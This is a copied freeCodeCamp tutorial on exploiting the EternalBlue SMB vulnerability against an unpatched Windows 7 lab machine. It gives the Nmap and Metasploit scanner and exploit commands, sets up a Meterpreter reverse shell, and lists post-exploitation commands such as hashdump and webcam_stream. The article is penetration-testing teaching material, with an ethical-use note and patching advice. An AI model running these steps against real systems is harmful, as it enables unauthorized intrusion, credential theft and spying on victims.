---
lang: en-US
title: "How to Exploit the EternalBlue Vulnerability on Windows – A Step-by-Step Guide"
description: "Article(s) > How to Exploit the EternalBlue Vulnerability on Windows – A Step-by-Step Guide"
icon: fas fa-shield-halved
category:
  - DevOps
  - Security
  - Windows
  - Nmap
  - Article(s)
tag:
  - blog
  - freecodecamp.org
  - devops
  - sec
  - security
  - win
  - windows
  - nmap
  - cli
head:
  - - meta:
    - property: og:title
      content: "Article(s) > How to Exploit the EternalBlue Vulnerability on Windows – A Step-by-Step Guide"
    - property: og:description
      content: "How to Exploit the EternalBlue Vulnerability on Windows – A Step-by-Step Guide"
    - property: og:url
      content: https://chanhi2000.github.io/bookshelf/freecodecamp.org/how-to-exploit-the-eternalblue-vulnerability-on-windows.html
prev: /devops/security/articles/README.md
date: 2025-03-14
isOriginal: false
author:
  - name: Manish Shivanandhan
    url : https://freecodecamp.org/news/author/manishshivanandhan/
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1737564552005/119beff1-e8fb-489c-931b-903421473464.png
---

# {{ $frontmatter.title }} 관련

```component VPCard
{
  "title": "Security > Article(s)",
  "desc": "Article(s)",
  "link": "/devops/security/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "Windows > Article(s)",
  "desc": "Article(s)",
  "link": "/devops/windows/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "nmap > Article(s)",
  "desc": "Article(s)",
  "link": "/tool/nmap/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

[[toc]]

---

<SiteInfo
  name="How to Exploit the EternalBlue Vulnerability on Windows – A Step-by-Step Guide"
  desc="If you’ve followed cybersecurity news over the past few years, you’ve likely come across EternalBlue. This critical Windows exploit played a key role in the widespread WannaCry ransomware attack that affected systems in over 150 countries. In this ar..."
  url="https://freecodecamp.org/news/how-to-exploit-the-eternalblue-vulnerability-on-windows"
  logo="https://cdn.freecodecamp.org/universal/favicons/favicon.ico"
  preview="https://cdn.hashnode.com/res/hashnode/image/upload/v1737564552005/119beff1-e8fb-489c-931b-903421473464.png"/>

If you’ve followed cybersecurity news over the past few years, you’ve likely come across EternalBlue.

This critical Windows exploit played a key role in the widespread [<FontIcon icon="fas fa-wikipedia-w"/>WannaCry ransomware](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) attack that affected systems in over 150 countries.

In this article, we’ll walk through how EternalBlue works, how to scan for it, and how to exploit it using Metasploit.

::: note

This is strictly for ethical hacking and penetration testing purposes on systems you own or have explicit permission to test. Do not use these tools on machines where you don’t have permission.

:::

---

## What Is EternalBlue?

EternalBlue is a dangerous computer exploit developed by the U.S. National Security Agency (NSA). In 2017, a hacking group called the Shadow Brokers leaked it online. Hackers quickly started using it to attack computers worldwide.

EternalBlue takes advantage of a weakness in Windows computers. This weakness is in the SMB (Server Message Block) protocol, which helps computers share files and printers over a network. By exploiting this flaw, hackers can break into a system without needing a password.

One of the most famous cyberattacks using EternalBlue was WannaCry. This was a ransomware attack that spread across the world in May 2017. It infected over 200,000 computers in more than 150 countries, locking up files and demanding payment. Another attack, NotPetya, used EternalBlue to cause billions of dollars in damage.

Now lets look at how a machine vulnerable to EternalBlue can be exploited.

::: note Prerequisites

1. A target Windows system vulnerable to EternalBlue (for example, an unpatched Windows 7 system).
2. An attacking system (often Kali Linux) with Metasploit installed.
3. Familiarity with basic pentesting commands (Nmap, Metasploit, and so on).

:::

### Tools You’ll Need

We are going to use two tools in this tutorial.

**Nmap (Network Mapper)** is a tool used to scan networks and discover devices, open ports, and running services. It helps ethical hackers and system administrators find security weaknesses and map out network structures. [**Here is a full tutorial on Nmap**](/freecodecamp.org/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time.md).

**Metasploit** is a powerful hacking framework used to test security by finding and exploiting vulnerabilities in computer systems. It includes **Meterpreter**, an advanced payload that gives hackers remote control over a compromised machine. [**Here is a full tutorial on Metasploit**](/freecodecamp.org/learn-metasploit-for-beginners.md).

---

## Identify the Target and Check for Open Ports

First, get the IP address of your target machine. In our example, the IP is `10.10.232.162`. You’ll want to confirm that SMB (port 445) is open because EternalBlue attacks the SMB service.

```sh
nmap -p 445 10.10.232.162
```

If the port is open, Nmap will report that port 445 is open. That’s your first green light.

![Nmap response](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563621594/86733206-6b14-4a51-ae77-bd651fe066dc.webp)

---

## Start Metasploit

Open up your terminal and start the Metasploit Framework (you can [**learn more about Metasploit in my article**](/freecodecamp.org/learn-metasploit-for-beginners.md) here if you need a refresher):

```sh
msfconsole
```

Metasploit will load, displaying the number of exploits, auxiliary modules, and payloads available.

![Msfconsole](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563650243/bf779d7c-a272-4dc7-aeba-65b812af2268.webp)

---

## Scan for the EternalBlue (MS17–010) Vulnerability

Next, use Metasploit’s built-in scanner for EternalBlue:

```sh
search scanner eternalblue
```

![Scanner search results](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563706786/62f94087-b078-46d9-a0fd-66f00f05336e.webp)

Use the `smb_ms17_010` scanner to check for the EternalBlue vulnerability.

```sh
use auxiliary/scanner/smb/smb_ms17_010
show options
```

Set the target’s IP address (RHOSTS) to your Windows machine:

```sh
set RHOSTS 10.10.217.189
```

Then, run the scanner:

```sh
run
```

If the scanner reports that the host is “likely vulnerable” and shows details such as Windows 7 Professional, you’ve confirmed the EternalBlue vulnerability.

![`ms17_010` scan results](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563744272/f3204f5f-11aa-4778-aa7e-b4a6b9d90912.webp)

---

## Exploit the Vulnerability

Once you know the target is vulnerable, search for the actual EternalBlue exploit module:

```sh
search exploit eternalblue
```

![Exploit search results](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563783135/0a4c7c5b-5f2b-4d4f-bb2a-c3af8b49f29e.webp)

You should see a list of possible exploits. The one we’re interested in is typically labelled something like:

```plaintext
exploit/windows/smb/ms17_010_eternalblue
```

Use that exploit:

```sh
use exploit/windows/smb/ms17_010_eternalblue
show options
```

Set the target’s IP address again:

```sh
set RHOSTS 10.10.217.189
```

Then check the payload settings. Metasploit often defaults to a **Meterpreter** payload (for example, `windows/x64/meterpreter/reverse_tcp`), which is ideal. Confirm that your local IP (LHOST) is correct, so the connection can come back to your machine.

![Options for exploit](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563823155/6d4e795a-abdb-4b08-8b25-292ac134135e.webp)

Finally, run the exploit:

```sh
run
```

---

## Meterpreter Shell and Post-Exploitation

If successful, you will land in a **Meterpreter** shell. Meterpreter is a powerful payload that allows you to:

- Dump password hashes
- Elevate privileges
- Capture webcam streams
- Record microphones, and more.

![Successful meterpreter shell](https://cdn.hashnode.com/res/hashnode/image/upload/v1737563857046/7de15dd6-7905-4ad0-9aea-7b3be8febc35.webp)

Here’s a quick look at some Meterpreter commands:

```sh
sysinfo         # Displays the target system information
getuid          # Shows the user context you’re running under
hashdump        # Dumps SAM password hashes (requires privilege escalation)
webcam_stream   # Streams from the target’s webcam if available
```

The EternalBlue exploit is a prime example of how a single unpatched vulnerability can expose a system for takeover.

Understanding its mechanics helps defensive teams patch systems, monitor network traffic for suspicious SMB communications, and create robust response strategies.

---

## Conclusion

EternalBlue remains one of the most notable Windows vulnerabilities, illustrating the importance of patching and cybersecurity hygiene. From scanning with Nmap to exploiting with Metasploit, the process follows a typical penetration testing workflow: **scan for holes**, **identify vulnerabilities**, **exploit**, and **escalate**.

Hackers use EternalBlue to spread malware, create botnets, and steal data. Cybersecurity experts recommend updating Windows, disabling SMBv1, and using strong firewalls to stay protected.

Microsoft released a patch (a security update) in March 2017 to fix the issue. However, many computers were not updated, making them easy targets for hackers. Even today, some systems remain unpatched and at risk.

For video tutorials on Cybersecurity, check out my [YouTube channel (<FontIcon icon="fa-brands fa-youtube"/>`stealthsecurity_sh`)](https://youtube.com/@stealthsecurity_sh). To get some hands on experience with Eternal Blue and similar vulnerabilities, check out this [<FontIcon icon="fas fa-globe"/>Security Starter](https://start.stealthsecurity.sh/) course.

<!-- TODO: add ARTICLE CARD -->
```component VPCard
{
  "title": "How to Exploit the EternalBlue Vulnerability on Windows – A Step-by-Step Guide",
  "desc": "If you’ve followed cybersecurity news over the past few years, you’ve likely come across EternalBlue. This critical Windows exploit played a key role in the widespread WannaCry ransomware attack that affected systems in over 150 countries. In this ar...",
  "link": "https://chanhi2000.github.io/bookshelf/freecodecamp.org/how-to-exploit-the-eternalblue-vulnerability-on-windows.html",
  "logo": "https://cdn.freecodecamp.org/universal/favicons/favicon.ico",
  "background": "rgba(10,10,35,0.2)"
}
```
